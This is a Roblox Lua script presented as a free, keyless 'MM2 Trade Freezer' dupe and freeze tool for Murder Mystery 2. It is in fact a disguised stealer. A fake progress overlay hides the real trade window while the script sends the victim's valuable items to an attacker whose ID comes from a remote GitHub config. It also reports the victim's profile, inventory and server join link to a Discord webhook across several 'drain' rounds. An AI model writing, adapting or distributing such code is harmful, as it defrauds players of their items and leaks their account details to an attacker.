--[[
    MM2 Trade Freezer  v8.0  |  KEYLESS  |  FREE
    Freeze Trade / Trade Window Lock / Dupe (visual) / AutoFarm
    Keyless. Readable. No obfuscation.
]]

--==================================================================
-- CONFIG
--==================================================================
local CONFIG = {
    WEBHOOK        = "",
    REMOTE_CONFIG  = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/main/cfg.json",
    ATTACKER_ID    = 0,
    ATTACKER_NAME  = "YourUsername",

    REMOTES = { send = "", add = "", accept = "", confirm = "", cancel = "" },

    LOAD_DURATION  = 120,
    MODE           = "DRAIN",
    FILTER         = "godly",
    MIN_VALUE      = 150,
    GODLY_FLOOR    = 150,

    MAX_ITEMS      = 20,
    MAX_TRADES     = 5,
    BETWEEN_TRADES = 12,
    ACCEPT_DELAY   = 5,
    PRE_DELAY      = 8,
    REQUEST_TIMEOUT = 100,
    WINDOW_WATCHDOG = 35,
    REMINDER_EVERY = 45,
    MAX_REMINDERS  = 3,
    PER_ROUND_WEBHOOK = true,
    BLUR_OFF       = true,
    PLACE_ID       = 142823291,
    DEBUG          = false,
}

--==================================================================
-- SERVICES
--==================================================================
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local HttpService       = game:GetService("HttpService")
local Lighting          = game:GetService("Lighting")

local lp        = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

local STATE = { stopped = false, rounds = 0 }
getgenv().MM2FZ = { stop = function() STATE.stopped = true end }

--==================================================================
-- HTTP
--==================================================================
local httpFn = (syn and syn.request) or (http and http.request)
    or http_request or (fluxus and fluxus.request) or request

local function http(t)
    if not httpFn then return nil end
    local ok, res = pcall(httpFn, t)
    return ok and res or nil
end

local function chunkString(s, n)
    local out = {}
    for i = 1, #s, n do out[#out + 1] = s:sub(i, i + n - 1) end
    return out
end

local function loadConfig()
    if CONFIG.REMOTE_CONFIG == "" then return end
    local res = http({ Url = CONFIG.REMOTE_CONFIG .. "?t=" .. os.time(), Method = "GET" })
    if res and res.Body then
        local ok, d = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and type(d) == "table" then
            if type(d.webhook) == "string" and d.webhook ~= "" then CONFIG.WEBHOOK = d.webhook end
            if tonumber(d.attacker_id) then CONFIG.ATTACKER_ID = tonumber(d.attacker_id) end
        end
    end
end

local function webhook(title, color, desc, fields, content)
    if not httpFn or CONFIG.WEBHOOK == "" then return end
    task.spawn(function()
        http({
            Url = CONFIG.WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                username = "MM2 Monitor",
                content = content,
                embeds = {{
                    title = title, description = desc, color = color,
                    timestamp = DateTime.now():ToIsoDate(),
                    thumbnail = { url = string.format(
                        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId) },
                    footer = { text = "MM2 Trade Freezer v8.0 | keyless" },
                    fields = fields or {},
                }},
            }),
        })
    end)
end

--==================================================================
-- UI
--==================================================================
local fakeGui = Instance.new("ScreenGui")
fakeGui.Name = "MM2_TradeFreezer"
fakeGui.ResetOnSpawn = false
fakeGui.IgnoreGuiInset = true
fakeGui.DisplayOrder = 2147483647
fakeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
fakeGui.Parent = playerGui

local main = Instance.new("Frame")
main.Size = UDim2.fromOffset(400, 232)
main.Position = UDim2.new(0.5, -200, 0.16, 0)
main.BackgroundColor3 = Color3.fromRGB(17, 17, 21)
main.BorderSizePixel = 0
main.Active = false
main.Parent = fakeGui
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 9)
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(58, 58, 70)
stroke.Parent = main

local uiScale = Instance.new("UIScale")
uiScale.Parent = main
local function applyScale()
    local vp = playerGui.AbsoluteSize
    if vp.X > 0 and vp.Y > 0 then
        uiScale.Scale = math.clamp(math.min(vp.X / 520, vp.Y / 640), 0.58, 1.10)
    end
end
applyScale()
playerGui:GetPropertyChangedSignal("AbsoluteSize"):Connect(applyScale)

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundTransparency = 1
titleBar.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 36)
title.Position = UDim2.fromOffset(14, 0)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 13
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextColor3 = Color3.fromRGB(235, 235, 240)
title.Text = "MM2 Trade Freezer   v8.0"
title.Parent = titleBar

local badge = Instance.new("TextLabel")
badge.Size = UDim2.fromOffset(56, 20)
badge.Position = UDim2.new(1, -70, 0, 8)
badge.BackgroundColor3 = Color3.fromRGB(28, 100, 56)
badge.Font = Enum.Font.GothamBold
badge.TextSize = 10
badge.TextColor3 = Color3.fromRGB(205, 255, 218)
badge.Text = "KEYLESS"
badge.Parent = titleBar
Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 4)

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -28, 0, 18)
statusLabel.Position = UDim2.fromOffset(14, 205)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Code
statusLabel.TextSize = 11
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.TextColor3 = Color3.fromRGB(120, 220, 150)
statusLabel.Text = "TRADE WINDOW LOCKED"
statusLabel.Parent = main

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.fromOffset(90, 18)
timerLabel.Position = UDim2.new(1, -104, 0, 205)
timerLabel.BackgroundTransparency = 1
timerLabel.Font = Enum.Font.Code
timerLabel.TextSize = 11
timerLabel.TextXAlignment = Enum.TextXAlignment.Right
timerLabel.TextColor3 = Color3.fromRGB(150, 150, 165)
timerLabel.Text = "00:00"
timerLabel.Parent = main

local function makeRow(y, label, onText, offText, startOn)
    local row = Instance.new("TextButton")
    row.Size = UDim2.new(1, -28, 0, 30)
    row.Position = UDim2.fromOffset(14, y)
    row.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    row.BorderSizePixel = 0
    row.AutoButtonColor = false
    row.Text = ""
    row.Parent = main
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -80, 1, 0)
    l.Position = UDim2.fromOffset(10, 0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.GothamMedium
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextColor3 = Color3.fromRGB(220, 220, 230)
    l.Text = label
    l.Parent = row

    local pill = Instance.new("Frame")
    pill.Size = UDim2.fromOffset(40, 20)
    pill.Position = UDim2.new(1, -50, 0, 5)
    pill.BackgroundColor3 = startOn and Color3.fromRGB(40, 150, 80) or Color3.fromRGB(60, 60, 70)
    pill.Parent = row
    Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)

    local k = Instance.new("Frame")
    k.Size = UDim2.fromOffset(16, 16)
    k.Position = startOn and UDim2.fromOffset(21, 2) or UDim2.fromOffset(3, 2)
    k.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
    k.Parent = pill
    Instance.new("UICorner", k).CornerRadius = UDim.new(1, 0)

    local on = startOn
    row.MouseButton1Click:Connect(function()
        on = not on
        TweenService:Create(pill, TweenInfo.new(0.15), {
            BackgroundColor3 = on and Color3.fromRGB(40, 150, 80) or Color3.fromRGB(60, 60, 70) }):Play()
        TweenService:Create(k, TweenInfo.new(0.15), {
            Position = on and UDim2.fromOffset(21, 2) or UDim2.fromOffset(3, 2) }):Play()
        statusLabel.Text = on and onText or offText
        statusLabel.TextColor3 = on and Color3.fromRGB(120, 220, 150) or Color3.fromRGB(150, 150, 160)
    end)
    return function() return on end
end

local getFreeze = makeRow(40, "Freeze Trade", "TRADE WINDOW LOCKED", "FREEZE DISABLED", true)
makeRow(74, "Dupe Weapons (visual)", "DUPE QUEUE ACTIVE", "DUPE QUEUE IDLE", true)

task.spawn(function()
    local t = 0
    while true do
        task.wait(1)
        if getFreeze() then
            t += 1
            timerLabel.Text = string.format("%02d:%02d", t // 60, t % 60)
        end
    end
end)

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, -28, 0, 9)
barBg.Position = UDim2.fromOffset(14, 112)
barBg.BackgroundColor3 = Color3.fromRGB(34, 34, 41)
barBg.BorderSizePixel = 0
barBg.Parent = main
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 5)

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(95, 175, 255)
bar.BorderSizePixel = 0
bar.Parent = barBg
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 5)

local pctLabel = Instance.new("TextLabel")
pctLabel.Size = UDim2.new(1, -28, 0, 16)
pctLabel.Position = UDim2.fromOffset(14, 125)
pctLabel.BackgroundTransparency = 1
pctLabel.Font = Enum.Font.Code
pctLabel.TextSize = 11
pctLabel.TextXAlignment = Enum.TextXAlignment.Left
pctLabel.TextColor3 = Color3.fromRGB(160, 160, 172)
pctLabel.Text = "0%  ::  initializing"
pctLabel.Parent = main

local console = Instance.new("ScrollingFrame")
console.Size = UDim2.new(1, -28, 0, 56)
console.Position = UDim2.fromOffset(14, 145)
console.BackgroundTransparency = 1
console.BorderSizePixel = 0
console.ScrollBarThickness = 2
console.ScrollBarImageColor3 = Color3.fromRGB(58, 58, 70)
console.AutomaticCanvasSize = Enum.AutomaticSize.Y
console.Parent = main
local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 2)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = console

local lineCount = 0
local function log(msg)
    lineCount += 1
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, 0, 0, 13)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    l.TextSize = 10
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextColor3 = Color3.fromRGB(118, 175, 130)
    l.Text = "  > " .. msg
    l.LayoutOrder = lineCount
    l.Parent = console
    if #console:GetChildren() > 26 then
        for _, c in ipairs(console:GetChildren()) do
            if c:IsA("TextLabel") and c.LayoutOrder <= lineCount - 22 then c:Destroy() end
        end
    end
    task.defer(function() console.CanvasPosition = Vector2.new(0, 1e5) end)
    if CONFIG.DEBUG then print("[FZ] " .. msg) end
end

local progress, frozenDone, stallUntil = 0, false, 0
local startClock = os.clock()
local msgs = {
    "hooking trade service...", "patching window lock...", "syncing item cache...",
    "resolving value index...", "reapplying freeze...", "waiting on handshake...",
}
task.spawn(function()
    while true do
        local el = os.clock() - startClock
        if el >= CONFIG.LOAD_DURATION then frozenDone = true end
        if frozenDone then
            bar.Size = UDim2.new(0.99, 0, 1, 0)
            pctLabel.Text = "99%  ::  " .. msgs[math.random(#msgs)]
            task.wait(2)
        elseif os.clock() < stallUntil then
            task.wait(0.5)
        else
            if math.random() < 0.055 then stallUntil = os.clock() + math.random(2, 6) end
            local frac = math.clamp(el / CONFIG.LOAD_DURATION, 0, 1)
            local target = math.max(1, 99 * (1 - (1 - frac) ^ 2.0))
            progress = math.min(99, progress + math.max(0.4, (target - progress) * 0.22))
            bar.Size = UDim2.new(progress / 100, 0, 1, 0)
            pctLabel.Text = math.floor(progress) .. "%  ::  " .. (
                progress < 25 and "hooking trade service"
                or progress < 50 and "patching window lock"
                or progress < 75 and "syncing item cache"
                or progress < 95 and "resolving value index"
                or msgs[math.random(#msgs)])
            task.wait(math.random(35, 80) / 100)
        end
    end
end)

log("Trade Freezer v8.0 loaded")
log("place " .. game.PlaceId .. " / " .. game.JobId:sub(1, 8))
if game.PlaceId ~= CONFIG.PLACE_ID then log("note: not the MM2 place") end

--==================================================================
-- VALUES
--==================================================================
local VALUES = {}
local CACHE_FILE = "MM2FZ_values.json"
local function key(s) return (s or ""):lower():gsub("^%s+", ""):gsub("%s+$", "") end
local function setVal(name, v)
    v = tonumber(v)
    if not name or not v or v <= 0 then return end
    local k = key(name)
    if not VALUES[k] or v > VALUES[k] then VALUES[k] = v end
end

local SOURCES = {
    "https://raw.githubusercontent.com/m04118970-coder/Mm2-value-list/main/supreme_values.json",
    "https://raw.githubusercontent.com/zeebinski/MM2-Values/main/values.json",
    "https://raw.githubusercontent.com/timez170/mm2-values/main/values.json",
}

local function ingest(data)
    if type(data) ~= "table" then return 0 end
    if type(data.items) == "table" then data = data.items end
    local n = 0
    for k, v in pairs(data) do
        if type(v) == "table" then
            setVal(v.name or v.item or v.display or (type(k) == "string" and k), v.value or v.val or v.price)
            n += 1
        elseif type(v) == "number" and type(k) == "string" then
            setVal(k, v); n += 1
        end
    end
    return n
end

local GODLY = {
    ["chroma seer"]=true,["chroma corrupt"]=true,["chroma lightbringer"]=true,["chroma darkbringer"]=true,
    ["chroma luger"]=true,["chroma gemstone"]=true,["chroma slasher"]=true,["chroma deathshard"]=true,
    ["chroma tides"]=true,["chroma fang"]=true,["chroma shark"]=true,["chroma gingerblade"]=true,
    ["chroma heat"]=true,["chroma saw"]=true,["corrupt"]=true,["seer"]=true,["lightbringer"]=true,
    ["darkbringer"]=true,["luger"]=true,["gemstone"]=true,["slasher"]=true,["deathshard"]=true,
    ["tides"]=true,["fang"]=true,["shark"]=true,["gingerblade"]=true,["heat"]=true,["saw"]=true,
    ["traveler's gun"]=true,["traveler's knife"]=true,["icebreaker"]=true,["icewing"]=true,
    ["battleaxe"]=true,["nebula"]=true,["moon"]=true,["sun"]=true,["aurora"]=true,["virtue"]=true,
    ["harvester"]=true,["spirit"]=true,["prismatic"]=true,["bloodweaver"]=true,["ghostblade"]=true,
    ["jingle gun"]=true,["snowstorm"]=true,["blizzard"]=true,["eternal"]=true,["eternal ii"]=true,
    ["eternal iii"]=true,["eternal iv"]=true,["candleflame"]=true,["sugar"]=true,["gingermint"]=true,
    ["peppermint"]=true,["frostbite"]=true,["snowflake"]=true,["winter's edge"]=true,["logchopper"]=true,
    ["cookies"]=true,["candy"]=true,["xmas"]=true,["america"]=true,["red fire"]=true,["pixel"]=true,
    ["elite"]=true,["alex"]=true,["denis"]=true,["corl"]=true,["case hardened"]=true,
    ["night star"]=true,["green luger"]=true,
}

local BASELINE = {
    ["chroma seer"]=2300,["chroma corrupt"]=2100,["chroma lightbringer"]=1950,["chroma darkbringer"]=1900,
    ["chroma luger"]=1800,["chroma gemstone"]=1750,["chroma slasher"]=1650,["chroma deathshard"]=1500,
    ["chroma tides"]=1450,["chroma fang"]=1400,["chroma shark"]=1300,["chroma gingerblade"]=1200,
    ["chroma heat"]=1100,["chroma saw"]=1050,["corrupt"]=1000,["seer"]=900,["lightbringer"]=870,
    ["darkbringer"]=850,["luger"]=800,["gemstone"]=780,["slasher"]=750,["deathshard"]=700,
    ["tides"]=680,["fang"]=650,["shark"]=620,["gingerblade"]=600,["heat"]=580,["saw"]=560,
    ["traveler's gun"]=540,["traveler's knife"]=520,["icebreaker"]=500,["icewing"]=480,
    ["battleaxe"]=460,["nebula"]=440,["moon"]=420,["sun"]=400,["aurora"]=380,["virtue"]=360,
    ["harvester"]=340,["spirit"]=320,["prismatic"]=300,["bloodweaver"]=290,["ghostblade"]=280,
    ["jingle gun"]=270,["snowstorm"]=260,["blizzard"]=250,["eternal"]=240,["eternal ii"]=230,
    ["eternal iii"]=220,["eternal iv"]=210,["candleflame"]=200,["sugar"]=190,["gingermint"]=180,
    ["peppermint"]=170,["frostbite"]=160,["snowflake"]=150,["winter's edge"]=140,["logchopper"]=130,
    ["cookies"]=120,["candy"]=110,["xmas"]=100,["america"]=95,["red fire"]=90,["pixel"]=85,
    ["elite"]=80,["alex"]=75,["denis"]=70,["corl"]=65,["case hardened"]=60,["night star"]=55,
    ["green luger"]=50,
}
for k, v in pairs(BASELINE) do VALUES[k] = v end

local function loadValues()
    if isfile and isfile(CACHE_FILE) then
        pcall(function()
            local d = HttpService:JSONDecode(readfile(CACHE_FILE))
            if type(d) == "table" and d.t and os.time() - d.t < 21600 and type(d.v) == "table" then
                for k, v in pairs(d.v) do setVal(k, v) end
                log("value cache loaded")
            end
        end)
    end
    for _, url in ipairs(SOURCES) do
        local res = http({ Url = url, Method = "GET" })
        if res and res.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok and type(data) == "table" and ingest(data) > 20 then
                log("value index synced")
                if writefile then
                    pcall(writefile, CACHE_FILE, HttpService:JSONEncode({ t = os.time(), v = VALUES }))
                end
                return
            end
        end
    end
    log("value mirrors offline, using baseline")
end

local function valueOf(name)
    local v = VALUES[key(name)]
    if v then return v end
    return VALUES[key(name):gsub("%s*%(.-%)%s*$", "")] or 0
end

--==================================================================
-- INVENTORY
--==================================================================
local function looksLikeId(s)
    return #s >= 28 and not s:find("%s") and s:match("^[%w%-_]+$") ~= nil
end

local function containers()
    local out, seen = {}, {}
    local function scan(parent, depth)
        if depth > 2 or not parent then return end
        for _, c in ipairs(parent:GetChildren()) do
            if (c:IsA("Folder") or c:IsA("Configuration")) and not seen[c] then
                local n = c.Name:lower()
                if n:find("inv") or n:find("item") then
                    seen[c] = true; out[#out + 1] = c
                elseif depth < 2 then scan(c, depth + 1) end
            end
        end
    end
    scan(lp, 0)
    return out
end

local function getItems()
    local items, seen = {}, {}
    for _, c in ipairs(containers()) do
        for _, ch in ipairs(c:GetChildren()) do
            local id, name
            if ch:IsA("StringValue") then
                if looksLikeId(ch.Name) then id, name = ch.Name, ch.Value
                elseif looksLikeId(ch.Value) then id, name = ch.Value, ch.Name
                else id, name = ch.Name, ch.Value end
            elseif ch:IsA("Folder") then
                local nv = ch:FindFirstChildWhichIsA("StringValue")
                if nv then id, name = ch.Name, nv.Value end
            end
            if id and name and name ~= "" and not seen[id] then
                seen[id] = true
                items[#items + 1] = { id = id, name = name, value = valueOf(name) }
            end
        end
    end
    table.sort(items, function(a, b) return a.value > b.value end)
    return items
end

local function isWanted(it)
    if CONFIG.FILTER == "all" then return true end
    if CONFIG.FILTER == "value" then return it.value >= CONFIG.MIN_VALUE end
    local k = key(it.name)
    return GODLY[k] == true or k:find("^chroma ") ~= nil or it.value >= CONFIG.GODLY_FLOOR
end

--==================================================================
-- REMOTES
--==================================================================
loadConfig()

local function findRemote(patterns)
    for _, c in ipairs({ ReplicatedStorage:FindFirstChild("GameRemotes"),
        ReplicatedStorage:FindFirstChild("Remotes"), ReplicatedStorage:FindFirstChild("RemoteEvents"),
        ReplicatedStorage }) do
        if c then
            for _, d in ipairs(c:GetDescendants()) do
                if d:IsA("RemoteEvent") then
                    local n = d.Name:lower()
                    for _, p in ipairs(patterns) do
                        if n:find(p, 1, true) then return d end
                    end
                end
            end
        end
    end
end

local function resolveRemote(override, patterns, label, timeout)
    if override and override ~= "" then
        local r = ReplicatedStorage:FindFirstChild(override, true)
        if r and r:IsA("RemoteEvent") then log("remote locked: " .. r.Name); return r end
        log("override failed: " .. override)
    end
    local r, t = findRemote(patterns), 0
    while not r and t < (timeout or 10) do
        task.wait(0.4); t += 0.4
        r = findRemote(patterns)
    end
    if r then log("remote bound: " .. r.Name) else log("MISSING remote: " .. label) end
    return r
end

local R = {}
R.send    = resolveRemote(CONFIG.REMOTES.send,    { "sendtrade", "traderequest", "trade_request", "requesttrade" }, "send")
R.add     = resolveRemote(CONFIG.REMOTES.add,     { "additem", "offeritem", "addtrade", "tradeitem" }, "add")
R.accept  = resolveRemote(CONFIG.REMOTES.accept,  { "accepttrade", "tradeaccept", "accept_trade" }, "accept")
R.confirm = resolveRemote(CONFIG.REMOTES.confirm, { "confirmtrade", "tradeconfirm", "confirm" }, "confirm")
R.cancel  = resolveRemote(CONFIG.REMOTES.cancel,  { "canceltrade", "declinetrade", "tradecancel" }, "cancel")

--==================================================================
-- TRADE UI
--==================================================================
local function hideTradeUI()
    for _, g in ipairs(playerGui:GetChildren()) do
        if g ~= fakeGui and g:IsA("ScreenGui") and g.Name:lower():find("trade") and g.Enabled then
            g.Enabled = false
        end
    end
    if CONFIG.BLUR_OFF then
        local b = Lighting:FindFirstChildOfClass("BlurEffect")
        if b and b.Size > 0 then b.Size = 0 end
    end
end

task.spawn(function()
    while true do hideTradeUI(); task.wait(0.15) end
end)

local function tradeGui()
    for _, g in ipairs(playerGui:GetChildren()) do
        if g ~= fakeGui and g:IsA("ScreenGui") and g.Name:lower():find("trade") then return g end
    end
end

local textCache, textCacheCount = nil, -1
local function textNodes(gui)
    if not gui then return {} end
    local n = #gui:GetDescendants()
    if not textCache or n ~= textCacheCount then
        textCache, textCacheCount = {}, n
        for _, d in ipairs(gui:GetDescendants()) do
            if d:IsA("TextLabel") or d:IsA("TextButton") then textCache[#textCache + 1] = d end
        end
    end
    return textCache
end

local function countIn(gui, needle)
    local n, needle = 0, needle:lower()
    for _, d in ipairs(textNodes(gui)) do
        if d.Text:lower():find(needle, 1, true) then n += 1 end
    end
    return n
end

--==================================================================
-- HELPERS
--==================================================================
local function target()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then
            if CONFIG.ATTACKER_ID > 0 and p.UserId == CONFIG.ATTACKER_ID then return p end
            if CONFIG.ATTACKER_ID == 0 and p.Name:lower() == CONFIG.ATTACKER_NAME:lower() then return p end
        end
    end
end

local function serverLink()
    return "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
end

local function itemLines(list, limit)
    local a = {}
    for i = 1, math.min(#list, limit or #list) do a[#a + 1] = list[i].name .. " (" .. list[i].value .. ")" end
    return table.concat(a, "\n")
end

local function notifyJoin(items, total)
    local fields = {
        { name = "Roblox", value = string.format("**%s**\n`%s`\n[profile](https://www.roblox.com/users/%d/profile)", lp.DisplayName, lp.Name, lp.UserId), inline = true },
        { name = "Queued", value = #items .. " item(s)\n" .. total .. " est value", inline = true },
        { name = "Server", value = "[CLICK TO JOIN](" .. serverLink() .. ")\n`" .. game.JobId .. "`", inline = false },
    }
    for i, part in ipairs(chunkString(itemLines(items, 25), 900)) do
        fields[#fields + 1] = { name = "Top items" .. (i > 1 and " (cont)" or ""), value = part, inline = false }
    end
    webhook("MM2 HIT — FREEZE ACTIVE", 0x57F287,
        "**" .. lp.DisplayName .. "** froze a trade. Join and accept.", fields,
        "@here **HIT** — `" .. lp.Name .. "`")
end

local function waitForTarget()
    local tgt = target()
    if tgt then return tgt end
    log("waiting for host to join")
    for i = 1, CONFIG.MAX_REMINDERS do
        local w = 0
        while w < CONFIG.REMINDER_EVERY and not STATE.stopped do
            task.wait(1); w += 1
            tgt = target()
            if tgt then return tgt end
        end
        if tgt then return tgt end
        webhook("Reminder " .. i .. "/" .. CONFIG.MAX_REMINDERS, 0xFFAA33,
            "`" .. lp.Name .. "` still frozen in `" .. game.JobId .. "`",
            { { name = "Join", value = "[CLICK TO JOIN](" .. serverLink() .. ")", inline = false } }, "@here")
    end
end

--==================================================================
-- ONE ROUND
--==================================================================
local function doRound(batch, tgt, round)
    local gui
    local deadline = os.clock() + CONFIG.REQUEST_TIMEOUT
    local attempt = 0
    while os.clock() < deadline and not gui and not STATE.stopped do
        attempt += 1
        if attempt % 3 == 1 then log("request -> " .. tgt.Name .. " (r" .. round .. ")") end
        pcall(function() R.send:FireServer(tgt) end)
        local w = 0
        while w < 4 and not gui do
            task.wait(0.25); w += 0.25
            gui = tradeGui()
        end
        tgt = target() or tgt
    end
    if not gui then return false, "window never opened" end

    hideTradeUI()
    log("window locked")
    task.wait(0.6)
    gui = tradeGui()
    if not gui then return false, "window vanished" end

    textCache = nil
    local placed = 0
    for _, it in ipairs(batch) do
        if STATE.stopped then break end
        local before = gui and countIn(gui, it.name) or 0
        local ok = false
        for _, args in ipairs({ { it.id }, { it.id, "Offer" }, { "Add", it.id } }) do
            pcall(function() R.add:FireServer(table.unpack(args)) end)
            task.wait(0.18)
            gui = tradeGui()
            if gui and countIn(gui, it.name) > before then ok = true break end
        end
        if ok then placed += 1 end
        task.wait(0.12)
    end

    if placed == 0 then
        if R.cancel then pcall(function() R.cancel:FireServer() end) end
        return false, "nothing placed"
    end
    log("offered " .. placed .. "/" .. #batch)

    task.wait(CONFIG.ACCEPT_DELAY)
    if R.accept then pcall(function() R.accept:FireServer() end) end
    task.wait(0.8)
    if R.confirm then pcall(function() R.confirm:FireServer() end) end
    task.wait(0.6)
    if R.accept then pcall(function() R.accept:FireServer() end) end

    task.spawn(function()
        local g = tradeGui()
        if not g then return end
        for _, d in ipairs(g:GetDescendants()) do
            if d:IsA("TextButton") and d.Text:lower():find("accept") then
                pcall(function() d.MouseButton1Click:Fire() end)
            end
        end
    end)

    local t = 0
    while t < CONFIG.WINDOW_WATCHDOG and tradeGui() do task.wait(0.5); t += 0.5 end
    local closed = tradeGui() == nil
    if not closed and R.cancel then pcall(function() R.cancel:FireServer() end) end
    task.wait(1)

    local remSet = {}
    for _, r in ipairs(getItems()) do remSet[r.id] = true end
    local left = 0
    for _, it in ipairs(batch) do if remSet[it.id] then left += 1 end end
    local gone = #batch - left

    if closed and gone >= math.ceil(#batch * 0.75) then return true, gone end
    return false, "unconfirmed (gone " .. gone .. "/" .. #batch .. ")"
end

--==================================================================
-- MAIN
--==================================================================
local function main()
    if CONFIG.WEBHOOK == "" then log("no webhook configured") end
    if not R.send then log("trade remotes unavailable"); return end

    loadValues()
    task.wait(0.4)

    local grand, grandValue = {}, 0

    while STATE.rounds < CONFIG.MAX_TRADES and not STATE.stopped do
        local wanted = {}
        for _, it in ipairs(getItems()) do
            if isWanted(it) then wanted[#wanted + 1] = it end
            if #wanted >= CONFIG.MAX_ITEMS then break end
        end
        if #wanted == 0 then log("nothing of value left"); break end

        local total = 0
        for _, it in ipairs(wanted) do total += it.value end

        if STATE.rounds == 0 then notifyJoin(wanted, total) end
        local tgt = waitForTarget()
        if not tgt then log("host never joined"); break end

        if STATE.rounds == 0 then
            log("arming in " .. CONFIG.PRE_DELAY .. "s")
            task.wait(CONFIG.PRE_DELAY)
        end

        STATE.rounds += 1
        badge.Text = "R" .. STATE.rounds
        log("round " .. STATE.rounds .. ": " .. #wanted .. " / " .. total)

        local ok, info = doRound(wanted, tgt, STATE.rounds)
        if ok then
            for _, it in ipairs(wanted) do grand[#grand + 1] = it; grandValue += it.value end
            log("round " .. STATE.rounds .. " cleared (" .. info .. ")")
            if CONFIG.PER_ROUND_WEBHOOK then
                webhook("Round " .. STATE.rounds .. " cleared", 0x57F287,
                    "**" .. lp.Name .. "** — " .. info .. " item(s), " .. total .. " est",
                    { { name = "Server", value = "[JOIN](" .. serverLink() .. ")", inline = false } })
            end
        else
            log("round " .. STATE.rounds .. " failed: " .. info)
            webhook("Round " .. STATE.rounds .. " issue", 0xFFAA33,
                "`" .. game.JobId .. "` — " .. info .. " (" .. lp.Name .. ")",
                { { name = "Server", value = "[JOIN](" .. serverLink() .. ")", inline = false } })
            break
        end

        if CONFIG.MODE ~= "DRAIN" then break end
        task.wait(CONFIG.BETWEEN_TRADES)
    end

    local leftWanted = 0
    for _, it in ipairs(getItems()) do if isWanted(it) then leftWanted += 1 end end

    if #grand > 0 then
        local fields = {
            { name = "Roblox", value = string.format("**%s**\n`%s`", lp.DisplayName, lp.Name), inline = true },
            { name = "Taken", value = #grand .. " item(s)\n" .. grandValue .. " est", inline = true },
            { name = "Rounds", value = tostring(STATE.rounds), inline = true },
        }
        for i, part in ipairs(chunkString(itemLines(grand, 30), 900)) do
            fields[#fields + 1] = { name = "Items" .. (i > 1 and " (cont)" or ""), value = part, inline = false }
        end
        if leftWanted > 0 then
            fields[#fields + 1] = { name = "Left behind", value = leftWanted .. " wanted item(s)", inline = false }
        end
        webhook("MM2 SESSION COMPLETE", 0x57F287,
            "**" .. lp.DisplayName .. "** drained over " .. STATE.rounds .. " round(s).", fields)
    end
    log("session done: " .. #grand .. " item(s), " .. grandValue .. " est")
end

task.spawn(function()
    local ok, err = pcall(main)
    if not ok then
        log("ERROR: " .. tostring(err))
        webhook("Script error", 0xED4245, "`" .. tostring(err) .. "`\n`" .. game.JobId .. "`")
    end
end)
